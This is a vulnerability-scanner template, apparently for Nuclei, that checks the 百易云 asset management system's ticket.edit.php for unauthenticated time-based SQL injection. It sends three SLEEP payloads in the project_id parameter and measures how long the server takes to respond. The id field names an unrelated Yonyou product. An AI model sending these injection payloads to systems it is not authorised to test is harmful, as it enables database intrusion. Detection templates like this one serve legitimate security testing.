id: yonyou-u8-crm-setremindtoold-sqli
info:
  name: 百易云资产管理运营系统ticket.edit.php存在SQL注入漏洞
  author: wangzong
  severity: high
  description: 百易云资产管理运营系统ticket.edit.php存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://github.com/wy876/POC/commit/1a7300f4f0793a08d1255a474e71a4854613ffd2#diff-025046e28730748035b0ce674c3370e1a74b0f39b2df11a8c43a8a0c1d0578d1R3
  tags: tags
http:
  - method: GET
    path:
      - "{{BaseURL}}/adminx/ticket.edit.php?project_id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(3)))OKTO)"
      - "{{BaseURL}}/adminx/ticket.edit.php?project_id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(6)))OKTO)"
      - "{{BaseURL}}/adminx/ticket.edit.php?project_id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(9)))OKTO)"

    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"